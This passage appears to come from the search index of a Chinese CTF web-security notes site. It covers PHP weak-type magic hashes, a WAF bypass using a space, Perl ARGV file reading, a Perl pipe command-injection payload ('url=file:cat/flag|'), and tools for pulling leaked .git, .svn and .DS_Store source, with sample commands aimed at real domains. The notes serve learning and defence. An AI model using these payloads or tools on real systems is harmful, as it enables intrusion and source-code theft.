<p>\u539f\u9898\uff1a[NPUCTF2020]ezinclude</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E4%BC%A0%E5%8F%82%E6%A0%BC%E5%BC%8F/","title":"\u4f20\u53c2\u683c\u5f0f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u4e4b\u524d\u5728\u505a\u9898\u4e5f\u78b0\u4e0a\u8fd9\u6837\u7684\u4f20\u53c2\u65b9\u5f0f\uff0c\uff08\u5927\u6982\u7387\u662f\u56e0\u4e3a\u4e4b\u524d\u5b66\u7684\u65f6\u5019\u6bd4\u8f83\u4e0d\u4ed4\u7ec6\uff09</p> <p>this-&gt;code =@this-&gt;x()['Ginkgo'];</p> <p>\u8fd9\u91cc\u76f8\u5f53\u4e8e\u53ef\u4ee5\u7528get\u65b9\u5f0f\u8fdb\u884c\u53c2\u6570\u4f20\u9012\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/","title":"\u5f31\u7c7b\u578b\u6bd4\u8f83","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u867d\u7136\u7b80\u5355\u800c\u4e14\u53ef\u80fd\u662f\u89c1\u8fc7\u5f88\u591a\u6b21\uff0c\u4f46\u662f\u554a\u8fd8\u662f\u653e\u4e00\u4e0b</p> <p>\"admin\"==0\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5c06admin\u8f6c\u5316\u6210\u6570\u503c\uff0c\u5f3a\u5236\u8f6c\u5316,\u7531\u4e8eadmin\u662f\u5b57\u7b26\u4e32\uff0c\u8f6c\u5316\u7684\u7ed3\u679c\u662f0\u81ea\u7136\u548c0\u76f8\u7b49</p> <p>\"1admin\"==1\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u5c061admin\u8f6c\u5316\u6210\u6570\u503c,\u7ed3\u679c\u4e3a1\uff0c\u800c\u201cadmin1\u201c==1 \u5374\u7b49\u4e8e\u9519\u8bef\uff0c\u4e5f\u5c31\u662f\"admin1\"\u88ab\u8f6c\u5316\u6210\u4e860</p> <p>\"0e123456\"==\"0e456789\"\u76f8\u4e92\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5c060e\u8fd9\u7c7b\u5b57\u7b26\u4e32\u8bc6\u522b\u4e3a\u79d1\u5b66\u6280\u672f\u6cd5\u7684\u6570\u5b57\uff0c0\u7684\u65e0\u8bba\u591a\u5c11\u6b21\u65b9\u90fd\u662f\u96f6\uff0c\u6240\u4ee5\u76f8\u7b49\u3002</p> <p>0e\u5728\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u5c06\u5176\u89c6\u4f5c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u6240\u4ee5\u65e0\u8bba0e\u540e\u9762\u662f\u4ec0\u4e48\uff0c0\u7684\u591a\u5c11\u6b21\u65b9\u8fd8\u662f0\u3002md5('240610708')== md5('QNKCDZO')\u6210\u529f\u7ed5\u8fc7!</p> <pre><code>QNKCDZO\n\n0e830400451993494058024219903391\n\ns878926199a\n\n0e545993274517709034328855841020\n\ns155964671a\n\n0e342768416822451524974117254469\n\ns214587387a\n\n0e848240448830537924465865611904\n\ns214587387a\n\n0e848240448830537924465865611904\n\ns878926199a\n\n0e545993274517709034328855841020\n\ns1091221200a\n\n0e940624217856561557816327384675\n\ns1885207154a\n\n0e509367213418206700842008763514\nPlain Text\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E7%A9%BA%E6%A0%BC%E4%B8%8EWAF/","title":"\u7a7a\u683c\u4e0eWAF","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E7%A9%BA%E6%A0%BC%E4%B8%8EWAF/#wafnum","title":"\u5047\u5982waf\u4e0d\u5141\u8bb8num\u53d8\u91cf\u4f20\u9012\u5b57\u6bcd\uff1a","text":"<p>http://www.xxx.com/index.php?num=aaaa   //\u663e\u793a\u975e\u6cd5\u8f93\u5165\u7684\u8bdd</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728num\u524d\u52a0\u4e2a\u7a7a\u683c\uff1a</p> <p>http://www.xxx.com/index.php?num= aaaa</p> <p>\u8fd9\u6837waf\u5c31\u627e\u4e0d\u5230num\u8fd9\u4e2a\u53d8\u91cf\u4e86\uff0c\u56e0\u4e3a\u73b0\u5728\u7684\u53d8\u91cf\u53eb\u201c num\u201d\uff0c\u800c\u4e0d\u662f\u201cnum\u201d\u3002\u4f46php\u5728\u89e3\u6790\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u628a\u7a7a\u683c\u7ed9\u53bb\u6389\uff0c\u8fd9\u6837\u6211\u4eec\u7684\u4ee3\u7801\u8fd8\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c\u8fd8\u4e0a\u4f20\u4e86\u975e\u6cd5\u5b57\u7b26\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/PARAM/","title":"PARAM","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/PARAM/#csaw-ctf-2016-quals-i-got-id-200","title":"csaw-ctf-2016-quals i-got-id-200","text":"<p>my file_name =param(field_name);</p> <p>\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u540e\u8005post\u6216\u8005get\u7684\u6570\u636e.</p> <p>param()\u51fd\u6570\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\u7684\u6587\u4ef6\u4f46\u662f\u53ea\u6709\u7b2c\u4e00\u4e2a\u6587\u4ef6\u4f1a\u88ab\u653e\u5165\u5230\u4e0b\u9762\u7684\u63a5\u6536\u53d8\u91cf\u4e2d\u3002\u5982\u679c\u6211\u4eec\u4f20\u5165\u4e00\u4e2aARGV\u7684\u6587\u4ef6\uff0c\u90a3\u4e48Perl\u4f1a\u5c06\u4f20\u5165\u7684\u53c2\u6570\u4f5c\u4e3a\u6587\u4ef6\u540d\u8bfb\u51fa\u6765\u3002\u5bf9\u6b63\u5e38\u7684\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u4fee\u6539,\u53ef\u4ee5\u8fbe\u5230\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u7684\u76ee\u7684</p> <p>ARGV(\u76f8\u5f53\u4e8e\u672c\u9898\u76ee\u7684\u63a5\u53d7\u53d8\u91cf\u7684\u6570\u7ec4\uff0c\u8fd9\u4e2a\u6570\u7ec4\u91cc\u9762\u7684\u5185\u5bb9\u4f5c\u4e3a\u547d\u4ee4\u884c\u53ef\u4ee5\u6267\u884c\uff0c\u76f8\u5f53\u4e8e\u662fparam()\u63a5\u53d7get\u5230\u7684\u53c2\u6570\u5e76\u4e14\u653e\u5728ARGV\u4e2d\uff0c\u7136\u540eARFV\u4e2d\u9ed8\u8ba4\u5c31\u9ed8\u8ba4\u8c03\u7528\u6267\u884c)</p> <p>perl\u5c06perl\u547d\u4ee4\u884c\u7684\u53c2\u6570\u5217\u8868\u653e\u8fdb\u6570\u7ec4ARGV(@ARGV)\u4e2d\u3002\u65e2\u7136\u662f\u6570\u7ec4\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee($ARGV[n])\u3001\u904d\u5386\uff0c\u751a\u81f3\u4fee\u6539\u6570\u7ec4\u5143\u7d20</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/%E7%AE%A1%E9%81%93%E7%AC%A6/","title":"\u7ba1\u9053\u7b26","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/%E7%AE%A1%E9%81%93%E7%AC%A6/#bmzctf-hitcon_2017_ssrfme","title":"BMZCTF hitcon_2017_ssrfme","text":"<p>perl\u51fd\u6570\u770b\u5230\u8981\u6253\u5f00\u7684\u6587\u4ef6\u540d\u4e2d\u5982\u679c\u4ee5\u7ba1\u9053\u7b26\uff08\u952e\u76d8\u4e0a\u90a3\u4e2a\u7ad6\u6760\uff09\u7ed3\u5c3e\uff0c\u5c31\u4f1a\u4e2d\u65ad\u539f\u6709\u6253\u5f00\u6587\u4ef6\u64cd\u4f5c\uff0c\u5e76\u4e14\u628a\u8fd9\u4e2a\u6587\u4ef6\u540d\u5f53\u4f5c\u4e00\u4e2a\u547d\u4ee4\u6765\u6267\u884c\uff0c\u5e76\u4e14\u5c06\u547d\u4ee4\u7684\u6267\u884c\u7ed3\u679c\u4f5c\u4e3a\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u5199\u5165\u3002\u8fd9\u4e2a\u547d\u4ee4\u7684\u6267\u884c\u6743\u9650\u662f\u5f53\u524d\u7684\u767b\u5f55\u8005\u3002\u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u4f60\u4f1a\u770b\u5230perl\u7a0b\u5e8f\u8fd0\u884c\u7684\u7ed3\u679c\u3002</p> <p>url=file:cat/flag|&amp;filename=/123.txt</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9Btrick/","title":"CTF\u6bd4\u8d5b\u4e2d\u4fe1\u606f\u641c\u96c6\u7684\u4e00\u4e9btrick","text":"<p>1.hint\u6216\u6e90\u7801\u85cf\u5728html\u6e90\u7801\u4e2d</p> <p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u591a\u51c6\u5907\u51e0\u79cd\u65b9\u6cd5\u4ee5\u514d\u67d0\u4e9b\u65b9\u6cd5\u5931\u6548</p> <p>1\uff09\u6309F12\u67e5\u770b\u6e90\u7801</p> <p>2\uff09\u5728\u7f51\u5740\u6dfb\u52a0view-source:</p> <p>3\uff09\u76f4\u63a5\u4fdd\u5b58html\u6e90\u7801\u5230\u672c\u5730\uff0cFirefox\u4e0b\u76f4\u63a5\u6309Ctril+s\uff0c\u518d\u67e5\u770b\u6e90\u7801</p> <p>2.hint\u6216\u6e90\u7801\u85cf\u5728http\u4fe1\u606f\u91cc</p> <p>burpsuite\u6293\u5305\u68c0\u67e5</p> <p>3.\u85cf\u5728robots.txt\u91cc</p> <p>\u6ce8\u610f\u522b\u62fc\u9519</p> <ol> <li>www.zip\u7b49\u7c7b\u578b\u6cc4\u9732</li> </ol> <p>\u53ef\u4ee5\u76f4\u63a5\u626b\u51fa\u6765</p> <ol> <li>gitsvn\u7b49\u6cc4\u9732</li> </ol> <p>/.git/.svn</p> <p>\u4e5f\u662f\u4e0a\u5de5\u5177\u626b\u63cf</p> <p>6.vim\u4fee\u6539\u6587\u4ef6\u4f1a\u4ea7\u751f\u4e00\u4e2a\u4e34\u65f6\u4fdd\u5b58\u6587\u4ef6\uff0c\u8bbf\u95eeindex.php.swp</p> <p>7.\u85cf\u5728cookie\u91cc</p> <p>\u540cburp\u6293\u5305\u68c0\u67e5</p> <p>8.\u85cf\u5728DNS\u68c0\u67e5\u4fe1\u606f\u91cc</p> <p>\u5982\u56fe</p> <p></p> <p>\u963f\u91cc\u4e91\u8fd0\u7ef4\u68c0\u6d4b\u5e73\u53f0</p> <p>https://zijian.aliyun.com/</p> <p>9.\u67e5\u770bJS\u6e90\u7801</p> <p>10.\u5229\u7528\u7279\u5b9a\u7684\u6570\u636e\u5e93\u7684\u9ed8\u8ba4\u6587\u4ef6\u4f4d\u7f6e</p> <p>11./editor \u6216\u8005 /admin\u7b49\u7b49</p> <p>12.PING\u4e00\u4e0b\u770b\u770b</p> <p>ping\u68c0\u6d4b\u7ad9\u957f\u5de5\u5177</p> <p>http://ping.chinaz.com/</p> <p>13.PHP\u63a2\u9488\u5229\u7528</p> <p>\u6b22\u8fce\u8865\u5145</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/","title":"\u5341\u5927\u5e38\u89c1\u7684Web\u6e90\u7801\u6cc4\u6f0f\u6f0f\u6d1e\u53ca\u5176\u5229\u7528","text":"<p>Web\u6e90\u7801\u6cc4\u9732\u7684\u6f0f\u6d1e\uff1a</p> <p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <ul> <li>git\u6e90\u7801\u6cc4\u9732</li> <li>svn\u6e90\u7801\u6cc4\u9732</li> <li>hg\u6e90\u7801\u6cc4\u6f0f</li> <li>CVS\u6cc4\u9732</li> <li>Bazaar/bzr\u6cc4\u9732</li> <li>\u7f51\u7ad9\u5907\u4efd\u538b\u7f29\u6587\u4ef6</li> <li><code>WEB-INF/web.xml</code>\u6cc4\u9732</li> <li>DS_Store \u6587\u4ef6\u6cc4\u9732</li> <li>SWP \u6587\u4ef6\u6cc4\u9732</li> <li>GitHub\u6e90\u7801\u6cc4\u6f0f</li> </ul>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#1git","title":"1\u3001git \u6e90\u7801\u6cc4\u9732","text":"<p>Git\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u5728\u6267\u884c<code>git init</code>\u521d\u59cb\u5316\u76ee\u5f55\u7684\u65f6\u5019\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a<code>.git</code>\u76ee\u5f55\uff0c\u7528\u6765\u8bb0\u5f55\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u3002\u53d1\u5e03\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u5982\u679c\u6ca1\u6709\u628a<code>.git</code>\u8fd9\u4e2a\u76ee\u5f55\u5220\u9664\uff0c\u5c31\u76f4\u63a5\u53d1\u5e03\u5230\u4e86\u670d\u52a1\u5668\u4e0a\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1aGitHack</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/lijiejie/GitHack</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <p><pre><code>GitHack.py http://www.openssl.org/.git/\n</code></pre> \u4fee\u590d\u5efa\u8bae\uff1a\u5220\u9664.git\u76ee\u5f55\u6216\u8005\u4fee\u6539\u4e2d\u95f4\u4ef6\u914d\u7f6e\u8fdb\u884c\u5bf9.git\u9690\u85cf\u6587\u4ef6\u5939\u7684\u8bbf\u95ee\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#2svn","title":"2\u3001SVN \u6e90\u7801\u6cc4\u9732","text":"<p>SVN\u662f\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u3002\u5728\u4f7f\u7528SVN\u7ba1\u7406\u672c\u5730\u4ee3\u7801\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u540d\u4e3a.svn\u7684\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5305\u542b\u91cd\u8981\u7684\u6e90\u4ee3\u7801\u4fe1\u606f\u3002\u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u53d1\u5e03\u4ee3\u7801\u65f6\uff0c\u6ca1\u6709\u4f7f\u7528\u2018\u5bfc\u51fa\u2019\u529f\u80fd\uff0c\u800c\u662f\u76f4\u63a5\u590d\u5236\u4ee3\u7801\u6587\u4ef6\u5939\u5230WEB\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u5c31\u4f7f.svn\u9690\u85cf\u6587\u4ef6\u5939\u88ab\u66b4\u9732\u4e8e\u5916\u7f51\u73af\u5883\uff0c\u53ef\u4ee5\u5229\u7528.svn/entries\u6587\u4ef6\uff0c\u83b7\u53d6\u5230\u670d\u52a1\u5668\u6e90\u7801\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1aSeay SVN\u6f0f\u6d1e\u5229\u7528\u5de5\u5177</p> <p>\u4fee\u590d\u5efa\u8bae\uff1a\u5220\u9664web\u76ee\u5f55\u4e2d\u6240\u6709.svn\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5f00\u53d1\u4eba\u5458\u5728\u4f7f\u7528SVN\u65f6\uff0c\u4e25\u683c\u4f7f\u7528\u5bfc\u51fa\u529f\u80fd\uff0c\u7981\u6b62\u76f4\u63a5\u590d\u5236\u4ee3\u7801\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#3hg","title":"3\u3001hg\u6e90\u7801\u6cc4\u6f0f","text":"<p>Mercurial \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u4f7f\u7528<code>hg init</code>\u7684\u65f6\u5019\u4f1a\u751f\u6210.hg\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a dvcs-ripper</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/kost/dvcs-ripper</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <pre><code>rip-hg.pl -v -u http://www.example.com/.hg/\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#4cvs","title":"4\u3001CVS\u6cc4\u9732","text":"<p>CVS\u662f\u4e00\u4e2aC/S\u7cfb\u7edf\uff0c\u591a\u4e2a\u5f00\u53d1\u4eba\u5458\u901a\u8fc7\u4e00\u4e2a\u4e2d\u5fc3\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u6765\u8bb0\u5f55\u6587\u4ef6\u7248\u672c\uff0c\u4ece\u800c\u8fbe\u5230\u4fdd\u8bc1\u6587\u4ef6\u540c\u6b65\u7684\u76ee\u7684\u3002\u4e3b\u8981\u662f\u9488\u5bf9 CVS/Root\u4ee5\u53caCVS/Entries\u76ee\u5f55\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u770b\u5230\u6cc4\u9732\u7684\u4fe1\u606f\u3002</p> <p><pre><code>http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f\nhttp://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784\n</code></pre> \u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1advcs-ripper github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/kost/dvcs-ripper.git</p> <p>\u8fd0\u884c\u793a\u4f8b:</p> <pre><code>rip-cvs.pl -v -u http://www.example.com/CVS/\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#5bazaarbzr","title":"5\u3001Bazaar/bzr\u6cc4\u9732","text":"<p>bzr\u4e5f\u662f\u4e2a\u7248\u672c\u63a7\u5236\u5de5\u5177, \u867d\u7136\u4e0d\u662f\u5f88\u70ed\u95e8, \u4f46\u5b83\u4e5f\u662f\u591a\u5e73\u53f0\u652f\u6301, \u5e76\u4e14\u6709\u4e0d\u9519\u7684\u56fe\u5f62\u754c\u9762\u3002</p> <p>\u8fd0\u884c\u793a\u4f8b\uff1a</p> <pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#6","title":"6\u3001\u7f51\u7ad9\u5907\u4efd\u538b\u7f29\u6587\u4ef6","text":"<p>\u7ba1\u7406\u5458\u5c06\u7f51\u7ad9\u6e90\u4ee3\u7801\u5907\u4efd\u5728Web\u76ee\u5f55\u4e0b\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u731c\u89e3\u6587\u4ef6\u8def\u5f84\uff0c\u4e0b\u8f7d\u5907\u4efd\u6587\u4ef6\uff0c\u5bfc\u81f4\u6e90\u4ee3\u7801\u6cc4\u9732\u3002</p> <p>\u5e38\u89c1\u7684\u5907\u4efd\u6587\u4ef6\u540e\u7f00\uff1a</p> <ul> <li>.rar</li> <li>.zip</li> <li>.7z</li> <li>.tar.gz</li> <li>.bak</li> <li>.txt</li> <li>.old</li> <li>.temp</li> </ul> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a\u5fa1\u5251</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#7web-infwebxml","title":"7\u3001<code>WEB-INF/web.xml</code>\u6cc4\u9732","text":"<p><code>WEB-INF</code>\u662fJava\u7684WEB\u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0c\u5982\u679c\u60f3\u5728\u9875\u9762\u4e2d\u76f4\u63a5\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\uff0c\u5fc5\u987b\u901a\u8fc7web.xml\u6587\u4ef6\u5bf9\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u8fdb\u884c\u76f8\u5e94\u6620\u5c04\u624d\u80fd\u8bbf\u95ee\u3002</p> <p><code>WEB-INF</code>\u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a</p> <p><pre><code>WEB-INF/web.xml : Web\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6, \u63cf\u8ff0\u4e86servlet\u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219.\nWEB-INF/database.properties : \u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\nWEB-INF/classes/ : \u4e00\u822c\u7528\u6765\u5b58\u653eJava\u7c7b\u6587\u4ef6(.class)\nWEB-INF/lib/ : \u7528\u6765\u5b58\u653e\u6253\u5305\u597d\u7684\u5e93(.jar)\nWEB-INF/src/ : \u7528\u6765\u653e\u6e90\u4ee3\u7801(.asp\u548c.php\u7b49)\n</code></pre> \u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#8ds_store","title":"8\u3001DS_Store \u6587\u4ef6\u6cc4\u9732","text":"<p>.DS_Store\u662fMac\u4e0bFinder\u7528\u6765\u4fdd\u5b58\u5982\u4f55\u5c55\u793a \u6587\u4ef6/\u6587\u4ef6\u5939 \u7684\u6570\u636e\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u5bf9\u5e94\u4e00\u4e2a\u3002\u5982\u679c\u5c06.DS_Store\u4e0a\u4f20\u90e8\u7f72\u5230\u670d\u52a1\u5668\uff0c\u53ef\u80fd\u9020\u6210\u6587\u4ef6\u76ee\u5f55\u7ed3\u6784\u6cc4\u6f0f\uff0c\u7279\u522b\u662f\u5907\u4efd\u6587\u4ef6\u3001\u6e90\u4ee3\u7801\u6587\u4ef6\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/lijiejie/ds_store_exp</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <pre><code>ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#9swp","title":"9\u3001SWP \u6587\u4ef6\u6cc4\u9732","text":"<p>swp\u5373swap\u6587\u4ef6\uff0c\u5728\u7f16\u8f91\u6587\u4ef6\u65f6\u4ea7\u751f\u7684\u4e34\u65f6\u6587\u4ef6\uff0c\u5b83\u662f\u9690\u85cf\u6587\u4ef6\uff0c\u5982\u679c\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\uff0c\u4e34\u65f6\u6587\u4ef6\u81ea\u52a8\u5220\u9664\uff0c\u5982\u679c\u610f\u5916\u9000\u51fa\u5c31\u4f1a\u4fdd\u7559\uff0c\u6587\u4ef6\u540d\u4e3a .filename.swp\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\uff1a\u76f4\u63a5\u8bbf\u95ee.swp\u6587\u4ef6\uff0c\u4e0b\u8f7d\u56de\u6765\u540e\u5220\u6389\u672b\u5c3e\u7684.swp\uff0c\u83b7\u5f97\u6e90\u7801\u6587\u4ef6\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#10github","title":"10\u3001GitHub\u6e90\u7801\u6cc4\u6f0f","text":"<p>GitHub\u662f\u4e00\u4e2a\u9762\u5411\u5f00\u6e90\u53ca\u79c1\u6709\u8f6f\u4ef6\u9879\u76ee\u7684\u6258\u7ba1\u5e73\u53f0\u3002\u5f88\u591a\u4eba\u559c\u6b22\u628a\u81ea\u5df1\u7684\u4ee3\u7801\u4e0a\u4f20\u5230\u5